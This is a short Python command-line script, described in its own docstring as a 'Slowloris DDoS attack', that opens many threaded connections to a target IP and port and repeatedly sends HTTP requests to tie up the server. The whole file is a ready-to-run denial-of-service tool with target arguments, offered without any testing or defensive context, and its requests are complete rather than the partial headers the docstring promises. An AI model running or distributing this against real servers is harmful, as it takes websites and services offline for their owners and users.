#!/usr/bin/python3
# -*- coding: utf-8 -*-

"""
Description:
    Slowloris DDoS attack
Author: Moni Keo

How it work:
    1. Opens a connection, sends partial HTTP headers
    2. waits before sending the next part to keep the connection open for as long as possible.
"""

import socket
import time
import threading
import argparse
import os

def create_parser():
    description = "Command-line Slowloris DDoS attack"
    parser = argparse.ArgumentParser(description)
    parser.add_argument("-p", "--port", help="Port connection")
    parser.add_argument("-n", "--num_connections", help="number of connections, default 200 connections")
    parser.add_argument("-i", "--ip", help="IP/Host")
    return parser

def slowloris_connections(target_ip, target_port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target_ip, target_port))
        request = "GET / HTTP/1.1\r\n"
        request += f"Host: {target_ip}\r\n"
        request += "Connection: Keep-Alive\r\n"
        request += "User-Agent: Slowloris\r\n"
        request += "Accept-Encoding: gzip, deflate\r\n\r\n"

        while True:
            print(request)
            s.send(request.encode())
            # Send data evey 10 seconds
            time.sleep(10)
    except socket.error:
        print(f"Connection to {target_ip} lost.")

def slowloris(target_ip, target_port, num_connections=200):
    threads = []
    for _ in range(num_connections):
        thread = threading.Thread(target=slowloris_connections,
                                  args=(target_ip, target_port))
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()

def main():
    parser = create_parser()
    args = parser.parse_args()

    if args.port and args.ip:
        ip = str(args.ip) 
        port = int(args.port)
        if args.num_connections:
            num_connections = int(args.num_connections)
            slowloris(ip, port, num_connections)
        else :
            slowloris(ip, port)
    else:
        parser.print_help()
    
if __name__ == "__main__":
    main()

